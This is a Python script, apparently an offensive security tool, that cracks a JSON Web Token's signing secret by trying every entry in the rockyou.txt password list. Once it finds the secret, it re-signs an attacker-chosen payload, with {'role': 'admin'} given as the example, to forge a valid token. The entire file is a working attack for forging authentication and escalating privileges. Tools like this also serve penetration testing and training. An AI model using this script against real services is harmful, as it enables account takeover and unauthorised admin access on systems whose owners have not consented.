import ast

from authlib.jose import jwt, JoseError


class JWTBruteForcer:
    def __init__(self, token, wordlist):
        self.token = token
        self.wordlist = wordlist
        self.secret = None

    def brute_force(self):
        with open(self.wordlist, 'r', encoding='latin-1') as file:
            for line in file:
                self.secret = line.strip()
                try:
                    decoded = jwt.decode(self.token, self.secret)
                    print(f"[+] Secret found: {self.secret}")
                    print(f"[+] Decoded payload: {decoded}")
                    return self.secret
                except JoseError:
                    continue
                except Exception as e:
                    print(f"[-] Unknown error: {str(e)}")
                    continue
        print("[-] No secret found.")
        return None

    def new_signature(self, payload):
        try:
            payload = ast.literal_eval(payload)
            header = jwt.decode(self.token, self.secret).header
            new_token = jwt.encode(header, payload, self.secret)
            print(f"[+] New token: {new_token.decode()}")
            decoded = jwt.decode(new_token, self.secret)
            print(f"[+] Decoded new payload: {decoded}")
        except ValueError:
            print("[-] Invalid payload format. Please enter a valid dictionary format like: {'role': 'admin'}")
        except Exception as e:
            print(f"[-] Error generating new token: {str(e)}")


def main():
    token = input("Enter the JWT token: ")
    wordlist = "./rockyou.txt"

    brute_forcer = JWTBruteForcer(token, wordlist)
    secret = brute_forcer.brute_force()

    if secret:
        change_payload = input("Do you want to change the payload? (y/n): ").lower()
        if change_payload == 'y':
            payload = input("Enter the new payload in dictionary format (e.g., {'role': 'admin'}): ")
            brute_forcer.new_signature(payload)


if __name__ == "__main__":
    main()
